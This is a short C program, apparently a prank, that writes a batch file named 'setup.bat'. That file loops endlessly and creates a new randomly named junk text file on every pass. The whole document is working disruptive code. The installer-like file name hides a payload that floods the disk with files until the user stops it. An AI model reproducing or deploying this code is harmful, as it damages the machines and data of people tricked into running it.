#include <stdio.h>
#define PATH "setup.bat"

int main()
{
    FILE *fp = fopen(PATH, "w");

    fprintf(fp, "echo off\n:start\necho juice pilado .... Mosambi ka > hehehe%%random%%.txt\ngoto start");
    fclose(fp);
    
    return 0;
}